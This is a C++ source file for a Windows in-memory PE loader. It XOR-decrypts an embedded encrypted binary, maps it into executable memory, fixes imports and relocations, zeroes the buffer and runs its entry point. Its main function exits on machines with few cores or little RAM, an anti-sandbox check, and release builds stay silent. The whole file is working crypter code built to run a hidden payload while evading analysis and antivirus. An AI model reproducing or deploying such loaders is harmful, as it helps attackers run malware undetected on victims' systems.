#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <vector>
#include <regex>
#include "sample.h"
#include "config.h"

HMODULE hModule2;
LPVOID lpReserved2;

#define NEW_ADDRESS 0x00

// Define a macro for the debug printf
#ifdef _DEBUG
#define DEBUG_PRINTF(format, ...) printf(format, __VA_ARGS__)
#else
#define DEBUG_PRINTF(format, ...)
#endif

/*
Works with :
- 32bit exe
        dll

        Relocs doesn't work for some exe for some reasons

- XOR decrypts the PE
- Doesn't copy headers
*/

size_t my_strlen(const char* str) {
    //START
    size_t s = 0;
    for (; str[s] != '\0'; ++s);
    return s;
    //END
}

void decrypt(const char* key, int offset = 0, int limit = -1) {
	//START
    size_t key_size = my_strlen(key);
    const int bufferSize = sizeof(sample) / sizeof(sample[0]);
    if (limit == -1) limit = bufferSize;
	if (key_size == 0) return;
    for (int i = offset; i < limit ; i++) {
        sample[i] ^= key[i%key_size];
    }
	//END
}

// This function will load a DLL from a buffer into the current process.
// The DLL is expected to be in the PE format.
//
// Parameters:
// - dll_buffer: a buffer containing the DLL file to be loaded.
// - dll_size: the size of the DLL buffer, in bytes.
//
// Returns:
// - a handle to the loaded DLL, if successful.
// - NULL, if the DLL could not be loaded.
HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
{
	//START
    if (dll_size < sizeof(IMAGE_DOS_HEADER)) {
        return NULL;
    }

	decrypt(KEY, 0, 1024); // decrypt only the header
	
    const IMAGE_DOS_HEADER* dos_header = static_cast<const IMAGE_DOS_HEADER*>(dll_buffer);

    if (dll_size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
        return NULL;
    }

    const IMAGE_NT_HEADERS* nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS*>(static_cast<const char*>(dll_buffer) + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    const size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* image_base = (LPVOID)newBase;
    image_base = VirtualAlloc(image_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (image_base == NULL) {
        return NULL;
    }

    const IMAGE_SECTION_HEADER* section_headers = reinterpret_cast<const IMAGE_SECTION_HEADER*>(nt_headers + 1);
    // Copy the section data to the allocated memory.
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
        const IMAGE_SECTION_HEADER* section_header = section_headers + i;
		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //decrypt section
        memcpy(static_cast<char*>(image_base) + section_header->VirtualAddress, static_cast<const char*>(dll_buffer) + section_header->PointerToRawData, section_header->SizeOfRawData);
		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //encrypt back section
	}

    DEBUG_PRINTF("[+] Wrote section data\n");

    DEBUG_PRINTF("[+] Rebasing Dll\n");
    HMODULE dll_handle = static_cast<HMODULE>(image_base);


    // Get the address of the DLL's entry point.
    const void* entry_point = static_cast<const char*>(image_base) + nt_headers->OptionalHeader.AddressOfEntryPoint;

    // Get the address of the DLL's import directory.
    const IMAGE_IMPORT_DESCRIPTOR* import_directory = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(static_cast<const char*>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    DEBUG_PRINTF("[+] Fixing imports\n");

    while (import_directory->Name != 0) {
        const char* import_dll_name = static_cast<const char*>(image_base) + import_directory->Name;

        HMODULE import_dll = LoadLibraryA(import_dll_name);
        if (import_dll == NULL) {
            return NULL;
        }

        IMAGE_THUNK_DATA* import_thunk_data = reinterpret_cast<IMAGE_THUNK_DATA*>(static_cast<char*>(image_base) + import_directory->FirstThunk);

		while (import_thunk_data->u1.AddressOfData != 0) {
			if (IMAGE_SNAP_BY_ORDINAL(import_thunk_data->u1.Ordinal)) {
				DWORD ordinal = IMAGE_ORDINAL(import_thunk_data->u1.Ordinal);

				void* import_address = GetProcAddress(import_dll, reinterpret_cast<LPCSTR>(ordinal));

				if (import_address != nullptr) {
					*reinterpret_cast<void**>(import_thunk_data) = import_address;
				}
			}
			else {
				const IMAGE_IMPORT_BY_NAME* import_by_name = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(static_cast<const char*>(image_base) + import_thunk_data->u1.AddressOfData);

				void* import_address = GetProcAddress(import_dll, reinterpret_cast<const char*>(import_by_name->Name));

				if (import_address != nullptr) {
					*reinterpret_cast<void**>(import_thunk_data) = import_address;
				}
			}

			++import_thunk_data;
		}

        ++import_directory;
    }

    DEBUG_PRINTF("[+] Doing relocation\n");

    const IMAGE_BASE_RELOCATION* base_relocation = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(static_cast<const char*>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD delta = (DWORD)image_base - nt_headers->OptionalHeader.ImageBase;

    while (base_relocation->VirtualAddress != 0) {
        const WORD* relocation_block = reinterpret_cast<const WORD*>(base_relocation + 1);

        DWORD num_relocations = (base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (DWORD i = 0; i < num_relocations; ++i) {
            WORD relocation_entry = relocation_block[i];

            WORD type = relocation_entry >> 12;
            WORD offset = relocation_entry & 0xFFF;

            DWORD* reloc_address = reinterpret_cast<DWORD*>(static_cast<char*>(image_base) + base_relocation->VirtualAddress + offset);

            switch (type) {
            case IMAGE_REL_BASED_ABSOLUTE:
                break;

            case IMAGE_REL_BASED_HIGHLOW:
                *reloc_address += delta;
                break;

            default:
                break;
            }
        }

        base_relocation = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(reinterpret_cast<const char*>(base_relocation) + base_relocation->SizeOfBlock);
    }

    DEBUG_PRINTF("\n[+] Calling DllMain\n");
    if (entry_point != NULL) {
        void* entry_point_iat = static_cast<char*>(image_base) + nt_headers->OptionalHeader.AddressOfEntryPoint;

        // Cleaning
        dll_buffer = "";
		size_t sample_size = sizeof(sample) / sizeof(sample[0]);
		for (size_t i = 0; i < sample_size; i++) {
			sample[i] = 0;
		}

        // Call the DLL's entry point.
        reinterpret_cast<bool(__stdcall*)(HMODULE, DWORD, LPVOID)>(entry_point_iat)(hModule2, DLL_PROCESS_ATTACH, lpReserved2);
    }

    // Return a handle to the loaded DLL.
    return dll_handle;
	//END
}

void allo() {
	//START
    AllocConsole();
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout); // output only
	//END
}

#ifdef _DEBUG
int main(void)
#else
int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCmdLine,int       nShowCmd)
#endif
{
	//START
#ifdef _DEBUG
    allo();
#endif

    DEBUG_PRINTF("[+] Started\n");

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    ULONGLONG totalPhysicalMemory = memoryStatus.ullTotalPhys;

    // Convert total physical memory to gigabytes
    double totalPhysicalMemoryGB = static_cast<double>(totalPhysicalMemory) / (1024 * 1024 * 1024);

    // Get the number of processor cores
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numProcessorCores = systemInfo.dwNumberOfProcessors;
    if (numProcessorCores < 2 || (int)totalPhysicalMemoryGB < 4)
        return 0;

    const int bufferSize = sizeof(sample) / sizeof(sample[0]);
	
    HMODULE dll = RunPE(sample, bufferSize, NEW_ADDRESS);
    if (dll == NULL) {
        DEBUG_PRINTF("[-] Failed to load DLL\n");
        return 1;
    }

    return 0;
	//END
}
